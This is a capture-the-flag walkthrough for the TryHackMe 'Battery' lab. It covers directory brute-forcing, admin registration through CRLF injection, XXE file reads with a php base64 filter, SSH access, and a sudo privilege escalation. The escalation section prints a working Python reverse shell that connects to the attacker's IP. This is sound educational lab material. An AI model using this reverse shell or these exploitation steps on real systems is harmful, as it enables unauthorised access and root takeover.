Battery is a medium level room in Tryhackme. The initial foothold is obtained by getting the ```ssh credentials``` from a php page after using the ```php base64 bypass```. But the root flag is fairly easy to get. Unlike usual, the final objective is to get two user flags and the root flag.

Deploy the VM and let's Hack the machine.

## <ins>Enumeration</ins>
---
Let's start enumerating with the usual nmap scan.
<br>
![nmap_scan](/assets/img/tryhackme/battery/nmap_scan.png)
<br>
The nmap results show that the ports ```22/ssh``` and ```80/http``` port/service is open. Visiting the ```http``` service, I was greeted with this page.
<br>
![home_page](/assets/img/tryhackme/battery/3.png)
<br>
Use ```gobuster``` to bruteforce the hidden directories.
<br>
<pre>gobuster dir -u http://machine-ip/ -w /usr/share/dirb/wordlists/common.txt -x php,html,js,txt</pre>
<br>
![gobuster_results](/assets/img/tryhackme/battery/2.png)
<br>
Firstly, I checked the most interesting page ```admin.php``` and found the login page. I tried some common credentials and sql injection payloads, but had no luck with it. So, I created a new account in the ```admin.php``` page and found some tabs in the top of the page.
<br>
![page_tabs](/assets/img/tryhackme/battery/5.png)
<br>
I was able to take a look at every tab except the ```My Account``` and the ```command``` tabs which was locked out only for admins to use.
<br>
![admins_only](/assets/img/tryhackme/battery/8.png)
<br>
After checking the other pages from the ```gobuster``` results, I was left with ```/report``` . After moving into the ```/report``` page it prompted for download.

I checked the file type and found that it is an ```ELF``` file.
<br>
![file_type](/assets/img/tryhackme/battery/6.png)
<br>
I used ```strings``` to get the contents of the file. Alternatively, you can also use ```radare2``` or ```Ghidra```.
<br>
![strings_report](/assets/img/tryhackme/battery/7.png)
<br>
The first thing that caught my eye after using ```strings``` is the username ```admin@bank.a```. I tried taking a deeper look into the ```ELF``` file but it was a wasted effort.


## <ins>Registering Admin account</ins>
---
Then I tried creating a new account using the username ```admin@bank.a``` but an alert box popped up.
<br>
![admin_register](/assets/img/tryhackme/battery/9.png)
<br>
This is the part where it gets a little interesting. I fired up ```Burpsuite``` and played around with the parameters. Finally, I used ```CRLF vunlnerability``` to register the account. 

For those who don't know about ```CRLF vulnerability``` here is the definition: A ```Carriage Return Line Feed``` Injection vulnerability occurs when an application does not sanitize user input correctly and allows for the insertion of carriage returns and line feeds.

To do this, capture the request using ```Burp Proxy``` and hit ```Enter``` (a new line) after the username value.
<br>
![admin_register1](/assets/img/tryhackme/battery/10.png)
<br>
![registered_successfully](/assets/img/tryhackme/battery/11.png)
<br>
And boom!! Now we can login as admin.

## <ins>Exploiting XXE</ins>
---
Firstly, I checked the tabs that are only allowed for admins i.e the ```My account``` tab and found that it uses ```XML``` to reflect the ```account number``` parameter.
<br>
![xml_request](/assets/img/tryhackme/battery/12.png)
<br>
I grabbed the payload for the ```XXE - XML External Entity``` vulnerability payload from ```PayloadsAllthethings``` and tested for it,...which worked perfectly.
<br>
![xxe_burp](/assets/img/tryhackme/battery/13.png)
<br>
Then, I tried to pull out the ```/etc/passwd``` file using ```XXE``` but it didn't return anything. So, I tried it with the ```php base64 filter bypass```.
<br>
![xml_1](/assets/img/tryhackme/battery/23.png)
<br>
![base64_passwd](/assets/img/tryhackme/battery/14.png)
<br>
Decoding the base64 string we can get the two usernames from the /etc/passwd file. You can use ```Cyberchef``` or ```echo "base64-contents" | base64 -d```.
<br>
![base64_decode](/assets/img/tryhackme/battery/15.png)
<br>

## <ins>Getting SSH password</ins>
---
Doing the same thing for the ```acc.php``` page...
<br>
![xml_acc](/assets/img/tryhackme/battery/24.png)
<br>
![account_page](/assets/img/tryhackme/battery/16.png)
<br>
and decoding it, we can get the password for the user ```cyber```.
<br>
![cyber_pass](/assets/img/tryhackme/battery/17.png)
<br>

## <ins>Getting user flag 1</ins>
---
Log in using the credentials we just found into ```SSH``` and you can get the ```user flag 1``` in the home directory of the user ```cyber```.
<br>
![ssh_login](/assets/img/tryhackme/battery/18.png)
<br>

## <ins>Getting user flag 2</ins>
---
We can get the ```user flag 2``` in the home directory of the user ```yash```.

## <ins>Getting root</ins>
---
After doing some common priviledge escalation enumeration I found that the file ```/home/cyber/run.py``` can be run as root.
<br>
![sudo_l](/assets/img/tryhackme/battery/19.png)
<br>
Taking a closer look at the file, it is owned by ```root```, so we don't have enough permissions to edit it. But since it is in the home directory of the user ```cyber``` we can create a new file with the same name and run it as root.
<br>
![closer_look](/assets/img/tryhackme/battery/20.png)
<br>
<pre>
mv run.py tmp.py
touch run.py
nano run.py
</pre>
<br>
And enter the reverse shell python3 payload in the file. Remeber to edit the ```ip``` and the ```port``` values.
<br>
<pre>
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("your-vpn-ip",4444));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")'
</pre>
<br>
![python3_rev](/assets/img/tryhackme/battery/21.png)
<br>

Remeber to open a netcat listener in your local machine. To get the reverse shell run...
<br>
<pre>sudo /usr/bin/python3 /home/cyber/run.py</pre>
<br>
![root_shell](/assets/img/tryhackme/battery/22.png)
<br>
The root flag will be waiting for you in the ```/root``` directory.


Stay tuned for more...

That's it folks. Happy hacking!!!
